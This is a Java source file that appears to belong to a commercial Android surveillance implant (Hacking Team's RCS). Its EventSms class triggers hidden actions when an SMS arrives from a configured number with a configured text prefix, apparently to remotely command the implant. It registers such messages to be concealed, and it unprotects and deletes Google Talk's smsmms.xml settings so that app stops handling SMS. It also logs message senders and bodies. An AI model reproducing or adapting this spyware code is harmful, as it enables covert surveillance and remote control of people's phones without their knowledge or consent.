/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno -> mica vero! Que!!! -> per l'header e' vero. Z. ;)
 * *******************************************/

package com.android.dvci.event;

import java.io.File;

import org.w3c.dom.ProcessingInstruction;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ProcessStatus;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfEvent;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.file.AutoFile;
import com.android.dvci.file.Path;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.listener.BSm;
import com.android.dvci.listener.ListenerProcess;
import com.android.dvci.listener.ListenerSms;
import com.android.dvci.module.ProcessObserver;
import com.android.dvci.module.message.Sms;
import com.android.dvci.util.Check;
import com.android.dvci.util.StringUtils;
import com.android.mm.M;

public class EventSms extends BaseEvent implements Observer<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "EventSms"; //$NON-NLS-1$

	private int actionOnEnter;
	private String number, msg;

	//private ProcessObserver processObserver;

	@Override
	public void actualStart() {
		ListenerSms.self().attach(this);
		//processObserver = new ProcessObserver(this);
		//ListenerProcess.self().attach(processObserver);
	}

	@Override
	public void actualStop() {
		ListenerSms.self().detach(this);
		//ListenerProcess.self().detach(processObserver);
	}

	@Override
	public boolean parse(ConfEvent conf) {
		try {
			number = conf.getString(M.e("number"));
			msg = conf.getString(M.e("text")).toLowerCase();
			
			BSm.memorize(number, msg);

		} catch (final ConfigurationException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: params FAILED");//$NON-NLS-1$
			}
			return false;
		}

		return true;
	}

	@Override
	public void actualGo() {
		
	}
	
	@Override
	public void notifyProcess(ProcessInfo b) {
		if(b.status == ProcessStatus.STOP && b.processInfo.contains(M.e("com.google.android.talk"))){
			String xmlPath = M.e("/data/data/com.google.android.talk/shared_prefs/smsmms.xml");
			Path.unprotect(xmlPath);
			AutoFile file = new AutoFile(xmlPath);
			byte[] data = file.read();
			if(data==null)
				return;
			String content = new String(data);
			if(!StringUtils.isEmpty(content))
			if(content.contains(M.e("<boolean name=\"enable_smsmms_key\" value=\"true\""))){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (notifyProcess) Bad value!");
				}
				file.delete();
			}
		}
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sms s) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());//$NON-NLS-1$ //$NON-NLS-2$
		}
		
		if(!isInteresting(s, this.number, this.msg)){
			return 0;
		}

		onEnter();
		onExit();

		return 1;
	}

	public static boolean isInteresting(Sms s, String number, String msg) {
		if (s.getAddress().toLowerCase().endsWith(number) == false) {
			return false;
		}

		// Case insensitive
		if (s.getBody().toLowerCase().startsWith(msg) == false) {
			return false;
		}
		
		return true;
	}
}
